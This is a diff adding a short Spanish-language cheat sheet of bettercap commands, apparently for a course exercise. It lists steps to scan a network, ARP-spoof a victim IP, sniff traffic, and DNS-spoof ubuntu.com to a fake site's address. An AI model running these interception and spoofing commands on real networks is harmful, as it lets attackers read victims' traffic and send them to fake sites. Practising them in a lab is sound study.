@@ -1,0 +1,25 @@
+Comandos bettercap
+Requisitos de finalización
+arp scan
+net.probe on
+ticker on
+
+arp spoof
+set arp.spoof targets ip victima
+
+arp.spoof on
+
+ver tráfico
+set net,sniff,verbose false
+
+net.sniff on
+
+dns spoof
+set dns.spoof.domains ubuntu.com
+
+set dns.spoof.address ip falso sitio
+
+dns.spoof on
+
+salir
+exit
